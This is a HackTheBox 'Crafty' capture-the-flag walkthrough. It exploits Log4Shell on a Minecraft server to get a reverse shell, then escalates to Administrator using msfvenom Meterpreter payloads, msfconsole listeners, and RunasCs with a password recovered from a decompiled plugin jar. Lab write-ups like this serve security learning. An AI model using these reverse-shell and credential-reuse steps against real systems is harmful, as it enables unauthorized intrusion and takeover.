---
description: Crafty writeup by Thamizhiniyan C S
---

# Crafty

## Overview

Greetings everyone,

In this write-up, we will tackle Crafty from HackTheBox.

Machine link: [Crafty Machine](https://app.hackthebox.com/machines/Crafty)

Difficulty Level: Easy

Let's Begin 🙌

Firstly, connect to the HTB server using the OpenVPN configuration file generated by HTB.  [Click Here](https://help.hackthebox.com/en/articles/5185687-introduction-to-lab-access) to learn more about how to connect to VPN and access the boxes.

Once connected to the VPN service, click on "Join Machine" to access the machine's IP.

Upon joining the machine, you will be able to view the IP address of the target machine.

***

## Reconnaissance

### Nmap Port Scan

`nmap -p- -T4 -Pn <TARGET_IP>`

<figure><img src="../../.gitbook/assets/Untitled (4).png" alt=""><figcaption></figcaption></figure>

### Nmap Intense Scan

`nmap -A -p 80,25565 -v -Pn <TARGET_IP>`

<figure><img src="../../.gitbook/assets/Untitled 1 (5).png" alt=""><figcaption></figcaption></figure>

### Results

| Ports | Services  | Service Version          |
| ----- | --------- | ------------------------ |
| 80    | HTTP      | Microsoft-IIS httpd 10.0 |
| 25565 | Minecraft | Minecraft 1.16.5         |

***

## Information Gathering - crafty.htb

First, let's take a look at the website running on port 80.

<figure><img src="../../.gitbook/assets/Untitled 3 (5).png" alt=""><figcaption></figcaption></figure>

When attempting to access view port 80, it redirects to the domain `crafty.htb`. Therefore, to access the website, we need to append an entry to the `/etc/hosts` file, mapping the domain to the target IP address.

Command: `sudo vim /etc/hosts`

<figure><img src="../../.gitbook/assets/Untitled 4 (5).png" alt=""><figcaption></figcaption></figure>

Now we have access to the website. I used `Wappalyzer` to check the technologies employed, but nothing of particular interest was discovered.

<figure><img src="../../.gitbook/assets/Untitled 5 (4).png" alt=""><figcaption></figcaption></figure>

A subdomain, `play.crafty.htb`, was mentioned on the website. To access it, append another entry to the `/etc/hosts` file.

<figure><img src="../../.gitbook/assets/Untitled 7 (4).png" alt=""><figcaption></figcaption></figure>

However, upon attempting to access it, it redirected back to `crafty.htb`.

<figure><img src="../../.gitbook/assets/Untitled 6 (4).png" alt=""><figcaption></figcaption></figure>

### Subdomain Enumeration

`ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://FUZZ.crafty.htb/`

<figure><img src="../../.gitbook/assets/Untitled 10 (5).png" alt=""><figcaption></figcaption></figure>

### VHOST Enumeration

<figure><img src="../../.gitbook/assets/Untitled 11 (4).png" alt=""><figcaption></figcaption></figure>

Indeed, it seems that there wasn't anything noteworthy discovered on the website.

***

## Information Gathering - Port 25565

### CVE-2021-44228

Next, I began the process of enumerating the Minecraft server running on port 25565. I conducted a Google search to identify potential vulnerabilities and exploits specifically targeting Minecraft server version 1.16.5. Here's what I found:

{% embed url="https://nodecraft.com/blog/service-updates/minecraft-java-edition-security-vulnerability" %}

CVE-2021-44228 is a security vulnerability in the Apache Log4j library, a widely used logging framework in Java applications. This vulnerability, also known as Log4Shell, allows attackers to execute malicious code remotely by exploiting a flaw in the library's JNDI (Java Naming and Directory Interface) lookup mechanism.

Based on the information provided in the article, it appears evident that the Minecraft Server running on the target is vulnerable to CVE-2021-44228, as it utilizes the Log4j library.

Next, I proceeded to search for exploits and proofs of concept (PoCs) for this vulnerability and came across the following:

{% embed url="https://github.com/kozmer/log4j-shell-poc" %}

## Initial Access

### Understanding the Attack

The script provided in the repository sets up an HTTP server and an LDAP server for you. Additionally, it generates a payload that you can insert into the Minecraft game or client.

When you paste the crafted payload into the Minecraft client, it connects back to the HTTP server hosted by the script. This server then references the exploit hosted by the LDAP server within the script. Upon successful execution of the exploit, a reverse shell is established, connecting back to a listener on your attacker machine. This process allows you to gain control over the target system.

### Setting up the Environment

I cloned the above mentioned repository using Git.

<figure><img src="../../.gitbook/assets/Untitled 12 (4).png" alt=""><figcaption></figcaption></figure>

To set up the environment for the exploit to run, I first created a virtual environment using Python. Then, I installed the necessary dependencies mentioned in the `requirements.txt` file.

`python3 -m venv venv`

`source ./venv/bin/activate`

<figure><img src="../../.gitbook/assets/Untitled 13 (4).png" alt=""><figcaption></figcaption></figure>

Next, it's time to install the dependencies.

<figure><img src="../../.gitbook/assets/Untitled 14 (3).png" alt=""><figcaption></figcaption></figure>

To obtain the required Java SDK version as specified in the readme file of the repository, please follow the instructions provided in the repository's README file: [Getting the Java Version](https://github.com/kozmer/log4j-shell-poc?tab=readme-ov-file#getting-the-java-version).

Extract the downloaded file.

<figure><img src="../../.gitbook/assets/Untitled 15 (4).png" alt=""><figcaption></figcaption></figure>

Check whether you have installed the SDK correctly, by veryfing its version.

<figure><img src="../../.gitbook/assets/Untitled 16 (4).png" alt=""><figcaption></figcaption></figure>

Now, rename the sdk folder as mentioned in the repository.

<figure><img src="../../.gitbook/assets/Untitled 17 (5).png" alt=""><figcaption></figcaption></figure>

While examining the `poc.py` file to determine the required arguments for running the exploit, I noticed a variable named cmd with the value "`/bin/bash`" specified on line 26. It appears that the exploit was designed for a Linux target. However, since our target is a Windows machine (running Microsoft IIS server), we should modify the value to "`cmd.exe`" in order to obtain the shell.

<figure><img src="../../.gitbook/assets/Untitled 18 (5).png" alt=""><figcaption></figcaption></figure>

We have successfully set up the environment for the exploit to run.

### Setting up PyCraft

We require either the Minecraft game itself or a Minecraft client to connect to the Minecraft server running on the target. For this purpose, I've decided to utilize PyCraft, a Minecraft Python Client Library.

{% embed url="https://github.com/ammaraskar/pyCraft" %}

First clone the repository.

<figure><img src="../../.gitbook/assets/Untitled 20 (6).png" alt=""><figcaption></figcaption></figure>

Next install the dependencies.

<figure><img src="../../.gitbook/assets/Untitled 21 (5).png" alt=""><figcaption></figcaption></figure>

We have successfully set up PyCraft.

### Setting up a Netcat Listener

Since the exploit establishes a reverse shell back to our host, we need to set up a netcat listener on our attacking machine to receive the reverse shell. We will configure the netcat listener to listen on port 9001.

<figure><img src="../../.gitbook/assets/Untitled 19 (5).png" alt=""><figcaption></figcaption></figure>

### Performing the Attack

First let's start the HTTP and LDAP server.

`python3 poc.py --userip <HTB_TUN_IP/Attacker_IP> --webport 25565 --lport 9001`

<figure><img src="../../.gitbook/assets/Untitled 23 (4).png" alt=""><figcaption></figcaption></figure>

The highlighted text depicted in the image above represents the crafted payload.

Next, connect to the Minecraft server using PyCraft. Enter a random username, leave the password field empty, and input the IP address of the target machine in the Server host field. Then, paste the payload and press enter once connected to the server.

<figure><img src="../../.gitbook/assets/Untitled 24 (5).png" alt=""><figcaption></figcaption></figure>

Now, check the HTTP server hosted by the `poc.py` script. You'll notice that we have received a request from the Minecraft server, and the script has referred to the exploit accordingly.

<figure><img src="../../.gitbook/assets/Untitled 25 (4).png" alt=""><figcaption></figcaption></figure>

Now, check the netcat listener. You'll observe that the reverse shell has successfully connected to the listener, and you can see the command prompt from the target machine. This indicates that we have successfully executed the attack and gained access to the target machine.

<figure><img src="../../.gitbook/assets/Untitled 26 (4).png" alt=""><figcaption></figcaption></figure>

***

## Getting the User Flag

I found the `user.txt` file located at `C:\Users\svc_minecraft\Desktop` directory.

<figure><img src="../../.gitbook/assets/Untitled 27 (4).png" alt=""><figcaption></figcaption></figure>

***

## Privilege Escalation

### Finding the First Loop Hole

As I was navigating through the directories on the target machine, I found that there was nothing noteworthy in the logs folder and other files. However, I came across a suspicious file named `playercounter-1.0-SNAPSHOT.jar` in the `C:\Users\svc_minecraft\plugins\` directory.

To examine that file, we need to download it to our attacker machine. Initially, I attempted to start an HTTP server from the target machine, but the firewall blocked it, and we don't have the necessary permissions to override it. Therefore, I opted to use Meterpreter to download the file instead.

### Generating the First Meterpreter Reverse Shell using msfvenom

To create a Meterpreter reverse shell using msfvenom, we first need to select a payload. To do this, we must determine the target machine's architecture. We can retrieve the processor architecture by executing the command "`echo %PROCESSOR_ARCHITECTURE%`" in the command prompt.

<figure><img src="../../.gitbook/assets/Untitled 32 (2).png" alt=""><figcaption></figcaption></figure>

Now we know that the target machine's architecture is x64, it's time to generate the reverse shell using msfvenom.

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HTB_TUN_IP/Attacker_IP> LPORT=4444 -f exe >> rev.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Untitled 33 (2).png" alt=""><figcaption></figcaption></figure>

We have successfully created the reverse shell.

### Setting up msfconsole

To set up a listener for the reverse shell to connect back, open msfconsole and enter the following commands:

```bash
use exploit/multi/handler
set lhost <HTB_TUN_IP/Attacker_IP>
set payload windows/x64/meterpreter/reverse_tcp
```

<figure><img src="../../.gitbook/assets/Untitled 37 (2).png" alt=""><figcaption></figcaption></figure>

Now its time to start the listener.

<figure><img src="../../.gitbook/assets/Untitled 38 (2).png" alt=""><figcaption></figcaption></figure>

### Sending the First Reverse Shell to Target

Let's create a simple http python server to transfer the reverse shell from out attacker machine to the target machine.

<figure><img src="../../.gitbook/assets/Untitled 34 (2).png" alt=""><figcaption></figcaption></figure>

While in the shell of the target machine, switch to PowerShell using the command "`powershell`", then type the following command to download the reverse shell.

<figure><img src="../../.gitbook/assets/Untitled 35 (2).png" alt=""><figcaption></figcaption></figure>

You can see that we have successfully transferred the reverse shell to the target machine.

<figure><img src="../../.gitbook/assets/Untitled 36 (2).png" alt=""><figcaption></figcaption></figure>

### Executing the Reverse Shell

Now its time to execute the reverse shell.

<figure><img src="../../.gitbook/assets/Untitled 39 (2).png" alt=""><figcaption></figcaption></figure>

Check the listener in msfconsole. You can see the meterpreter session.

<figure><img src="../../.gitbook/assets/Untitled 40 (2).png" alt=""><figcaption></figcaption></figure>

Now switch the plugins directory.

<figure><img src="../../.gitbook/assets/Untitled 41.png" alt=""><figcaption></figcaption></figure>

Use the `download` command to download the jar file from the target machine.

```bash
download C:\\users\\svc_minecraft\\server\\plugins\\playercounter-1.0-SNAPSHOT.jar
```

<figure><img src="../../.gitbook/assets/Untitled 42.png" alt=""><figcaption></figcaption></figure>

Now we have successfully downloaded the file to our attacker machine.

### Finding the Second Loop Hole

To view the contents of the JAR file, we require a Java decompiler. Jadx-GUI is one of the recommended decompilers available.

{% embed url="https://github.com/skylot/jadx" %}

Clone the mentioned repository.

<figure><img src="../../.gitbook/assets/Untitled 43.png" alt=""><figcaption></figcaption></figure>

Now build the JADX-GUI tool.

<figure><img src="../../.gitbook/assets/Untitled 44.png" alt=""><figcaption></figcaption></figure>

After the build process is complete, navigate to the `build/jadx/bin` directory and run the JADX-GUI application.

<figure><img src="../../.gitbook/assets/Untitled 45.png" alt=""><figcaption></figcaption></figure>

Now open the jar file.

<figure><img src="../../.gitbook/assets/Untitled 46.png" alt=""><figcaption></figcaption></figure>

After inspecting the contents and code of the JAR file, I came across a string that appears to resemble a password.

<figure><img src="../../.gitbook/assets/Untitled 47.png" alt=""><figcaption></figcaption></figure>

The password we found might be the Administrator's password.

### Finding a Way to Break Through

Since we've obtained the Administrator's password (albeit through a guess), we can attempt to escalate our privileges using common Windows privilege escalation techniques. One such method involves utilizing the built-in `runas` command in Windows, which is somewhat equivalent to the `sudo` command in Linux, allowing us to run processes with elevated privileges.

To know more:

{% embed url="https://juggernaut-sec.com/runas/" %}

In this scenario, I will utilize the RunasCs tool, an improved version of the default Windows runas.exe program.

{% embed url="https://github.com/antonioCoco/RunasCs" %}

You can download the latest version of RunasCs from here: [https://github.com/antonioCoco/RunasCs/releases](https://github.com/antonioCoco/RunasCs/releases)

Our objective is to leverage the RunasCs tool to execute a reverse shell as Administrator, utilizing the password we discovered.

### Generating the Second Reverse Shell

We can employ the same reverse shell that we've previously uploaded to the target machine. However, I've created a new reverse shell on a different port to ensure that the previous session remains undisturbed for backup.

{% code overflow="wrap" %}
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<HTB_TUN_IP/Attacker_IP> LPORT=4445 -f exe >> rev2.exe
```
{% endcode %}

<figure><img src="../../.gitbook/assets/Untitled 48.png" alt=""><figcaption></figcaption></figure>

### Setting up the Second Listener

Now, set up the second listener in another terminal within msfconsole.

<figure><img src="../../.gitbook/assets/Untitled 49.png" alt=""><figcaption></figcaption></figure>

### Uploading the RunasCs.exe and the Second Reverse Shell

Now, it's time to upload the RunasCs.exe and the second reverse shell to the target machine using the previously obtained Meterpreter shell.

<figure><img src="../../.gitbook/assets/Untitled 50.png" alt=""><figcaption></figcaption></figure>

### Executing the Second Reverse Shell with Elevated Privileges

Type the command "`shell`" to open the command prompt from the Meterpreter session, then execute the RunasCs.exe application to run the reverse shell with elevated privileges.

```powershell
.\RunasCs.exe Administrator s67u84zKq8IXw rev2.exe
```

<figure><img src="../../.gitbook/assets/Untitled 51.png" alt=""><figcaption></figcaption></figure>

Now, check the second Meterpreter session for the reverse shell with elevated privileges.

<figure><img src="../../.gitbook/assets/Untitled 52.png" alt=""><figcaption></figcaption></figure>

***

## Getting the Root Flag

You can get the root flag at `C:\Users\Administrator\Desktop` directory.

<figure><img src="../../.gitbook/assets/Untitled 53.png" alt=""><figcaption></figcaption></figure>

We have successfully obtained the user and root flag.

Thank You.....
